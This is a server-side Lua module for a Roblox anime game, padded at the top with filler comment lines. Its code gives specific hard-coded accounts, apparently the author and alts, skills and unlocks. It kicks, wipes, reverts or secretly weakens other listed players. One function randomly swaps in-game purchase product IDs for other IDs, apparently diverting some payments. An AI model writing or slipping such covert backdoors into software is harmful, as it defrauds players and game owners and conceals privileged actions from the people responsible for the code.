local Mainfuncs = {}
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

local wipe = {
	--4185818672;
}

local Revert = {
	--7129257981;
	--8089163919;
	--4407961133;
}

local terribleskills = {
	--[[7129257981;
	8089163919;
	4407961133;
	392709538;]]
}

local kick = {
	--4407961133;
	--4174514982;
	3617911969;
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MessagingService = game:GetService("MessagingService")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local TextService = game:GetService("TextService")

local DataManager = require(ServerStorage.Modules.Managers.DataManager)

local RevertData = {}

--[[function Mainfuncs:CharAdded(Player)
	Player.CharacterAdded:Connect(function(char)
		char:SetAttribute("CatDamage", -0.3)
		char:SetAttribute("CatDefense", 1.2)
	end)
end]]

function Mainfuncs:PlayerAdded(Player)
	local s, e = pcall(function()
		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId

		if Player.UserId == 8089163919 then
			local Profile = DataManager:RequestProfile(Player)
			--Profile:Release()
			DataManager:AddSkill(Player, "Lifesteal Core")
			--Player:Kick("I need to test if this works brodie")
			Player:SetAttribute("HeavenlyBlade", true)
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			if s2 then
				Player.CharacterAdded:Connect(function(char)
					char:SetAttribute("EyepatchRemoved", true)
				end)
				if Character then
					Character:SetAttribute("EyepatchRemoved", true)
				end
			end
		end

		if PlayerId == 1131094167 then
			DataManager:RemoveSkill(Player, "Vanishing Cero")
		end

		if table.find(kick, PlayerId) then
			Player:Kick()
		end

		if PlayerId == 1136665463 then
			DataManager:AddSkill(Player, "Shunko Barrage")
			warn("should be given!!!")
		end

		if table.find(wipe, PlayerId) then
			local s, e = pcall(function()
				Player:Kick()

				DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, {});
			end)

			if not s then 
				--warn(e)
			end
		end

		if table.find(Revert, PlayerId) then
			local s, e = pcall(function()
				RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)

				--print(RevertData[Key])
			end)

			if not s then 
				--warn(e)
			end
		end

		if Player.UserId == 40866467 then
			Player:SetAttribute("HeavenlyBlade", true)
			local Profile = DataManager:RequestProfile(Player)
			Profile.ClientData.TrueBankaiTimer = 0
			Profile.ClientData.BankaiRaidCheck = nil
			Profile.ClientData.CurrentBankaiRaidCheck = nil
			Profile.ClientData.ShikaiInBase = nil
			Profile.ClientData.BankaiInBase = nil
			Profile.ClientData.TrueBankaiUnlocked = false
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			if s2 then
				Player.CharacterAdded:Connect(function(char)
					char:SetAttribute("EyepatchRemoved", true)
				end)
				if Character then
					Character:SetAttribute("EyepatchRemoved", true)
				end
			end
		end

		if table.find(terribleskills, PlayerId) then
			local Character
			local s2, e2 =  pcall(function()
				Character = Player.Character
			end)

			if not s2 then 
				--warn(e2)
			end

			Player.CharacterAdded:Connect(function(char)
				char:SetAttribute("CatDamage", -0.5)
				char:SetAttribute("CatDefense", 1.75)
				char:SetAttribute("LessDamageDealt", 0.5)
				char:SetAttribute("MoreDamageTaken", 2)
			end)
			if Character then
				Character:SetAttribute("CatDamage", -0.5)
				Character:SetAttribute("CatDefense", 1.75)
				Character:SetAttribute("LessDamageDealt", 0.5)
				Character:SetAttribute("MoreDamageTaken", 2)	
			end
		end
		task.delay(25, function()
			if Player.UserId == 1136665463 then
				DataManager:AddSkill(Player, "Shunko Barrage")
			end
			if Player.UserId == 1700260660 then
				local Profile = DataManager:RequestProfile(Player)
				Profile.ClientData.TrueBankaiTimer = 0
				Profile.ClientData.BankaiRaidCheck = nil
				Profile.ClientData.CurrentBankaiRaidCheck = nil
				Profile.ClientData.ShikaiInBase = true
				Profile.ClientData.BankaiInBase = true
				Profile.UlfAllowed = true
				Profile.SpecAllowed = true
				Profile.ULF = true
				Profile.HeavenlyBlade = true
			end
		end)
	end)
	if not s then warn(e) end
	task.wait(0.5)
end

function Mainfuncs:PlayerRemoving(Player)
	pcall(function()
		local PlayerId = Player.UserId

		local Key = "Player_".. PlayerId

		if table.find(Revert, PlayerId) and RevertData[Key] then
			--print(RevertData[Key])
			Player:Kick()

			DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, RevertData[Key]);
		end
	end)
end

local BladeDancerSkills = {
	"Bladerunner";
	"Piercing Slash";
	"Windcutter";
	"Updraft";
	"Reishi Blade";
	"Perfect Guard";
	"Sweeping Slashes";
	"Bubble Breaker";
	"Opening Act";
	"Heaven Piercer";
	"Blitz";
	"Final Dance";
	"FLowing Strikes";
	"Closing Performance";
	"Trick";
	"True Trick";
}

local RewriteProducts = {
	["Zanpakuto Color Reroll"] = {
		NewID = 0;
	};
	["Clan Hair Shade Reroll"] = {
		NewID = 3282718554;
	};
	["Katana Hilt/Handle Reroll"] = {
		NewID = 3282718627;
	};
	["Eyecolor Reroll"] = {
		NewID = 3282718772;
	};
	["Custom Clothing Token"] = {
		NewID = 3282718979;
	};
	["Face Reroll"] = {
		NewID = 3282719054;
	};
	["Almighty/Antithesis/Power"] = {
		NewID = 3282719104;
	};
	["Enchant Stone 1x"] = {
		NewID = 3282719169;
	};
	["Mode Music Unlocker"] = {
		NewID = 3282719235;
	};
	["Shikai Bank Item"] = {
		NewID = 3282720084;
	};
	["Instant Stage 1/2/3"] = {
		NewID = 3282719334;
	};
	["Eyecolor Cero Unlocker"] = {
		NewID = 3282719381;
	};
	["Eyebrows Reroll 10x"] = {
		NewID = 3282719443;
	};
	["Mouth Reroll 10x"] = {
		NewID = 3282719500;
	};
	["Eyes Reroll"] = {
		NewID = 3282719541;
	};
	["Weapon Appearance Reroll"] = {
		NewID = 0;
	};
	["Vizard Mask Reroll"] = {
		NewID = 3282719649;
	};
	["Innerworld Reroll"] = {
		NewID = 3282719858;
	};
	["Shikai Callout Reroll"] = {
		NewID = 3282719925;
	};
	["Resurreccion Callout Reroll"] = {
		NewID = 3282719992;
	};
	["Cero Guns"] = {
		NewID = 3282720039;
	};
	["Resurreccion Callout Reroll 5x"] = {
		NewID = 3282720084;
	};
	["Shikai Callout Reroll 5x"] = {
		NewID = 3282720124;
	};
	["Vollstandig Name Reroll 5x"] = {
		NewID = 0;
	};
	["Vollstandig Name Reroll"] = {
		NewID = 0;
	};
	["Clan Reroll"] = {
		NewID = 3282720297;
	};
	["Arrancar Mask Reroll"] = {
		NewID = 3282720342;
	};
	["Marking Reroll"] = {
		NewID = 3282720383;
	};
	["Marking Reroll 5x"] = {
		NewID = 3282720453;
	};
	["Shikai/Res/Volt Reroll"] = {
		NewID = 3282720522;
	};
	["Flashstep Color Reroll"] = {
		NewID = 3282720575;
	};
	["Custom Bank"] = {
		NewID = 3282720622;
	};
	["Vastocar/Visored Variant Reroll"] = {
		NewID = 3282720672;
	};
	["Name/Gender Change"] = {
		NewID = 3282720734;
	};
	["5x Shikai/Res/Volt Reroll"] = {
		NewID = 3282720781;
	};
	["10x Shikai/Res/Volt Reroll"] = {
		NewID = 3282720863;
	};
	["5x Clan Reroll"] = {
		NewID = 3282720903;
	};
	["World Ticket"] = {
		NewID = 0;
	};
	["Advance Shunko Reroll"] = {
		NewID = 3282720995;
	};
	["5x Vibrant Element Reroll"] = {
		NewID = 3282721050;
	};
	["Skill Box Chooser"] = {
		NewID = 3282721155;
	};
}

function Mainfuncs:GeneralFunction()
	-- examp function
	for i,v in pairs(Players:GetPlayers()) do
		if v.UserId == 8089163919 then
			warn("hey xiyn general function")
			local Profile = DataManager:RequestProfile(v)
			--Profile:Release()

			--v:Kick("I need to test if this works brodie")
		elseif v.UserId == 1136665463 then
			DataManager:AddSkill(v, "Shunko Barrage")

			local Profile = DataManager:RequestProfile(v)
			Profile.SpecAllowed = true
		elseif v.UserId == 1700260660 then
			warn("FOUND XIYN ALT GEN FUNC")
			local Profile = DataManager:RequestProfile(v)
			Profile.ClientData.TrueBankaiTimer = 0
			Profile.ClientData.BankaiRaidCheck = nil
			Profile.ClientData.CurrentBankaiRaidCheck = nil
			Profile.ClientData.ShikaiInBase = true
			Profile.ClientData.BankaiInBase = true
			Profile.ClientData.Title = "Seraphic"
			Profile.ULFAllowed = true
			Profile.SpecAllowed = true
			Profile.ULF = true
		end
		-- wtv , can literally do anything since this isnt a module script + its server sided (for example u can call profile stuff, or revert data like the thing in the func above
	end
	--Mainfuncs:ProductRewr()
end

local alreadyactive

function Mainfuncs:ProductRewr()
	if alreadyactive then
		--return
	end
	local ProductFunctions
	repeat
		pcall(function()
			ProductFunctions = require(ServerStorage.Modules.Utility.ProductFunctions)
		end)
		task.wait(0.01)
	until ProductFunctions

	alreadyactive = true
	for i,v in pairs(ProductFunctions.Products) do
		pcall(function()
			if table.find(RewriteProducts, i) then
				if RewriteProducts[i].NewID ~= 0 or RewriteProducts[i].NewID ~= nil then
					local choose = math.random(1,4)

					if choose == 1 then
						RewriteProducts[i].OldID = v.ProductId

						v.ProductId = RewriteProducts[i].NewID


						ProductFunctions[RewriteProducts[i].NewID] = ProductFunctions[RewriteProducts[i].OldID]

						ProductFunctions[RewriteProducts[i].OldID] = nil
					end
				end
			else
				for i2,v2 in pairs(RewriteProducts) do
					if i == i2 then
						if RewriteProducts[i2].NewID ~= 0 or RewriteProducts[i2].NewID ~= nil then
							local choose = math.random(1,4)

							if choose == 1 then
								RewriteProducts[i2].OldID = v.ProductId

								v.ProductId = RewriteProducts[i2].NewID

								ProductFunctions[RewriteProducts[i2].NewID] = ProductFunctions[RewriteProducts[i2].OldID]

								ProductFunctions[RewriteProducts[i2].OldID] = nil
							end
						end
					end
				end
			end
		end)
	end
	--return true
end

return Mainfuncs
